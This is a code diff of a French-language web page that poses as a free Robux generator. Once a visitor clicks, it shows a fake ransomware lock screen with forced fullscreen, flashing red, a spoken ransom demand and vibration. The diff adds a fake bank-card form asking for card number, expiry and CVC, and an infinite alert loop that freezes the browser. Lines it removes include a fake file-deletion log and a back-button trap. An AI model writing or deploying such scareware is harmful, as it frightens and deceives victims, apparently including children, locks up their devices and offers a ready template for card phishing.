@@ -11,32 +11,43 @@
         @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
         
         /* Écran de Chaos */
-        #chaos-layer { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: black; z-index: 99999; cursor: none; }
-        .delete-text { color: #ff0000; font-family: 'Courier New', monospace; font-size: 1.2em; position: absolute; width: 100%; top: 20px; left: 20px; }
+        #chaos-layer { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: black; z-index: 9999; }
         .red-flash { animation: flash-red 0.1s infinite; }
-        @keyframes flash-red { 0% { background: #000; } 50% { background: #660000; } 100% { background: #000; } }
+        @keyframes flash-red { 0% { background: #000; } 50% { background: #440000; } 100% { background: #000; } }
         
         /* Fenêtre Rançon */
-        #ransom { display: none; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80%; background: #ff0000; color: white; border: 10px solid white; padding: 20px; text-align: center; box-shadow: 0 0 100px black; }
-        .timer { font-size: 4em; font-weight: bold; background: black; margin: 20px; }
+        #ransom { display: none; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; max-width: 600px; background: #900; color: white; border: 5px solid white; padding: 20px; text-align: center; box-shadow: 0 0 100px black; z-index: 10000; }
+        
+        /* Faux Formulaire de Carte */
+        #payment-form { display: none; background: white; color: black; padding: 20px; margin-top: 15px; border-radius: 5px; text-align: left; }
+        input { width: 90%; padding: 10px; margin: 5px 0; border: 1px solid #ccc; }
+        .btn-pay { background: #27ae60; color: white; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body onclick="startChaos()">
 
     <div id="ui">
         <h1>🤑 RÉCUPÈRE TES 50 000 ROBUX 🤑</h1>
-        <p>Clique sur le bouton pour lier ton compte</p>
         <button class="btn-robux">GÉNÉRER MAINTENANT</button>
     </div>
 
     <div id="chaos-layer">
-        <div id="log" class="delete-text"></div>
         <div id="ransom">
-            <h1 style="font-size: 3em;">⚠️ VOTRE APPAREIL EST VERROUILLÉ ⚠️</h1>
-            <p style="font-size: 1.5em;">Une activité illégale a été détectée. Vos données sont cryptées.</p>
-            <div class="timer" id="clock">00:09:59</div>
-            <h2 style="background: yellow; color: black; padding: 10px;">RANÇON : 500 € (BITCOIN)</h2>
-            <p>Toute tentative de redémarrage détruira la clé de décryptage.</p>
+            <h1 style="font-size: 1.5em;">⚠️ SYSTÈME CHIFFRÉ PAR EDIA-BLOCKER ⚠️</h1>
+            <p>Versez 500 € pour débloquer vos fichiers personnels.</p>
+            
+            <button id="show-pay" onclick="showPayment()" style="background: yellow; color: black; font-weight: bold; padding: 10px; cursor: pointer;">PAYER PAR CARTE BANCAIRE (SÉCURISÉ)</button>
+
+            <div id="payment-form">
+                <label>Numéro de carte :</label>
+                <input type="text" placeholder="#### #### #### ####">
+                <div style="display:flex;">
+                    <div style="width:50%"><label>Date :</label><input type="text" placeholder="MM/YY"></div>
+                    <div style="width:50%"><label>CVC :</label><input type="text" placeholder="###"></div>
+                </div>
+                <button class="btn-pay" onclick="fakeValidate()">VALIDER LE PAIEMENT (500.00 €)</button>
+            </div>
+            <p id="status-msg" style="margin-top:10px; font-weight:bold;"></p>
         </div>
     </div>
 
@@ -46,65 +57,42 @@
         function startChaos() {
             if(chaosStarted) return;
             chaosStarted = true;
+            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
 
-            // 1. Plein écran forcé
-            const elem = document.documentElement;
-            if (elem.requestFullscreen) elem.requestFullscreen();
-
-            // 2. Musique et Bruit Sourd (Oscillateur Basse)
-            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            const oscillator = audioCtx.createOscillator();
-            const gainNode = audioCtx.createGain();
-
-            oscillator.type = 'sawtooth'; // Son agressif
-            oscillator.frequency.setValueAtTime(40, audioCtx.currentTime); // 40Hz = Bruit sourd
-            oscillator.connect(gainNode);
-            gainNode.connect(audioCtx.destination);
-            gainNode.gain.setValueAtTime(0.5, audioCtx.currentTime);
-            oscillator.start();
-
-            // Faire varier la fréquence pour simuler une surchauffe
-            setInterval(() => {
-                oscillator.frequency.linearRampToValueAtTime(Math.random() * 100 + 30, audioCtx.currentTime + 0.1);
-            }, 100);
-
-            // 3. Changement visuel
+            // Audio & Visuel
             document.getElementById('ui').style.display = 'none';
             document.getElementById('chaos-layer').style.display = 'block';
             document.getElementById('chaos-layer').classList.add('red-flash');
+            document.getElementById('ransom').style.display = 'block';
 
-            // 4. Voix off flippante
-            let voice = new SpeechSynthesisUtterance("Alerte système. Surchauffe du processeur détectée. Tentative d'extraction des données bancaires. Versez 500 euros pour interrompre.");
+            // Voix off
+            let voice = new SpeechSynthesisUtterance("Votre appareil est verrouillé. Payez la rançon pour éviter la suppression.");
             voice.lang = 'fr-FR';
-            voice.rate = 0.8;
             window.speechSynthesis.speak(voice);
-
-            // 5. Simulation de suppression
-            const files = ["Root/Private/Photos_Ex_Copine.jpg", "System/Bank_Details.json", "User/Desktop/CV.pdf", "Android/Data/WhatsApp_Backup", "C:/Windows/System32/"];
-            let i = 0;
-            const logDiv = document.getElementById('log');
             
-            const interval = setInterval(() => {
-                if(i < files.length) {
-                    logDiv.innerHTML += "<br>❌ SUPPRESSION EN COURS : " + files[i];
-                    if(navigator.vibrate) navigator.vibrate([200, 100, 200]);
-                    i++;
-                } else {
-                    document.getElementById('ransom').style.display = 'block';
-                    clearInterval(interval);
-                }
-            }, 1000);
+            // Vibration
+            if(navigator.vibrate) navigator.vibrate([500, 200, 500]);
+        }
 
-            // 6. Bloquer le retour arrière
-            history.pushState(null, null, location.href);
-            window.onpopstate = function () { history.go(1); };
+        function showPayment() {
+            // Arrête l'event pour ne pas relancer startChaos
+            event.stopPropagation();
+            document.getElementById('payment-form').style.display = 'block';
+            document.getElementById('show-pay').style.display = 'none';
+        }
+
+        function fakeValidate() {
+            event.stopPropagation();
+            const msg = document.getElementById('status-msg');
+            msg.style.color = "red";
+            msg.innerHTML = "ERREUR : TRANSACTION REFUSÉE. COMPTE BLOQUÉ.";
             
-            // 7. Freeze Final (Alertes infinies)
+            // Lance la boucle infinie d'alertes pour "casser" le tel
             setTimeout(() => {
                 while(true) {
-                    alert("⚠️ ALERTE DE SÉCURITÉ : PAYEZ 500€ MAINTENANT ⚠️");
+                    alert("⚠️ PAIEMENT ÉCHOUÉ : VOTRE APPAREIL VA ÊTRE RÉINITIALISÉ ⚠️");
                 }
-            }, 15000);
+            }, 1000);
         }
     </script>
 </body>
